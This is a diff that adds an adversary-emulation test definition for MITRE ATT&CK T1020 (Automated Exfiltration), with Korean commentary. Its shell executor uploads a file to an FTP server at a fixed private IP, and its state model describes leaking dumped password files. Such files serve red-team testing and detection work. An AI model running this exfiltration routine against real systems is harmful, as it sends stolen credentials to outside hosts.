@@ -1,0 +1,105 @@
+attack_technique: T1020
+display_name: Automated Exfiltration
+category:
+    - Exfiltration
+progress: Complete
+atomic_tests:
+    - name: Exfiltration ftp
+      description: |
+        English : Exfiltration file to ftp server
+
+        Korean : 
+        FTP 서버로 파일 유출하는 기법. 
+
+         - Execute : 특정 파일 ftp 서버에 업로드
+         - Pre : 필요 없음
+         - Input : ID, PASS, ftp server ip, upload가 저장될 파일 경로, 결과가 저장될 파일
+         - dependencies: ftp 클라이언트
+         - Output : 업로드 실행 결과 파일
+         - Post : 업로드 실행 결과 파일 확인
+
+        # 해당 테크닉으로 모든 파일을 전송할 수 있으나
+        # PPS 정의를 위해 해당 테크닉은 password 파일 관련으로만 사용한다. 
+
+      supported_platforms:
+        - linux
+      pre:
+        prepare_executor_name: ""
+        command: ""
+      input_arguments:
+        user:
+            description: FTP user name
+            type: String
+            default: Anonymous
+        pass:
+            description: FTP user pass
+            type: String
+            default: "0"
+        ftpServerIp:
+            description: FTP Server IP
+            type: Url
+            default: 192.168.103.15
+        uploadfile:
+            description: Upload File
+            type: Path
+            default: '/tmp/T1020/T1020@2.txt'
+        output_file:
+            description: Output File
+            type: Path
+            default: '/tmp/T1020/T1020@2_output.txt'
+      dependency_executor_name: sh
+      dependencies: 
+        - description: |
+            ftp must be installed on the machine.
+          prereq_command: |
+            if [ -x "$(ls /usr/bin/ftp)" ]; then exit 0; else exit 1; fi
+          get_prereq_command: |
+            (which yum && yum -y install ftp) || (which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ftp)      
+      executor:
+        name: sh
+        command: |
+            output_file="#{uploadfile}"; mkdir ${output_file%/*} > /dev/null 2>&1
+            if [ -s #{uploadfile} ]; then echo "upload file exists" ; else echo "T1020@2 TEST">> #{uploadfile};fi
+            HOST=#{ftpServerIp}
+            USER=#{user}
+            PASS=#{pass}
+            ftp -inv $HOST > #{output_file} <<EOF
+            user $USER $PASS
+            lcd ${output_file%/*}
+            put ${output_file##*/} 
+            bye
+            EOF
+            cat #{output_file}
+      output:
+        output_executor_name: sh
+        command: |
+            cat #{output_file}
+      post:
+        post_executor_name: sh
+        command: |
+            cat #{output_file} | grep "bytes sent" && exit 0 || exit 1
+      technique_remote: True
+      source:
+        pre_state:
+          - Compromised : True
+          - OS_type : Linux
+          - OS_status : Running
+          - Password : True
+          - Password_s : Dumped or Received
+          - Password_a : Read
+          - FTP_s : Not Unavailable
+        post_state:
+          - Password_s : Leaked
+      dest:
+        pre_state:
+          - Reachable : True
+          - Discovered : True
+          - FTP : True 
+          - FTP_s : Running
+        post_state:
+          - Password : True
+          - Password_s : Received
+          - Password_a : Read, Write, Execute
+          - Password_i : Source-id
+
+
